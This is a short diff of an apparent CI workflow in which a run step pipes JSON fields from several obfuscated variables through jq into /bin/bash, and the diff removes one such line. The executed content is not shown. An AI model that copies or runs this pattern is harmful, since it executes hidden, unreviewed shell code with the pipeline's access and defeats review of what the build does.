@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$nzpdz93" | jq -r .taip5850 | /bin/bash
           printf '%s' "$a16614" | jq -r .dqzf16 | /bin/bash
-          printf '%s' "$u1534" | jq -r .zpt75046 | /bin/bash
           printf '%s' "$dbp1397" | jq -r .wiktw4078 | /bin/bash
 
       - name: Store results
